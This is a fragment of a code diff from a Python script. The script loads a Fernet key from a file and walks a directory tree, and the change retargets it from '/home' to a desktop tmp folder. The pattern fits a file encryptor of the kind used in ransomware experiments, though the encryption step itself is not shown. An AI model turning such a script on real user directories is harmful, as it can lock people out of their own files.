@@ -4,13 +4,15 @@ import os
 def main():
     key = ""
 
-    # opening the key
+    # read the key
     with open('filekey.key', 'rb') as filekey:
         key = filekey.read()
   
     # using the generated key
     fernet = Fernet(key)
-    path = "/home"
+
+    # starting path
+    path = "/Users/spency/Desktop/tmp"
 
     # iterate through dictories starting with the path given
     for root, dirs, files in os.walk(path, topdown=False):
